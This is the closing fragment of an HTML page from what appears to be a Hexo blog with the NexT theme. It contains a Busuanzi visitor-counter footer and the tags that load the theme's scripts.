       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.3' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
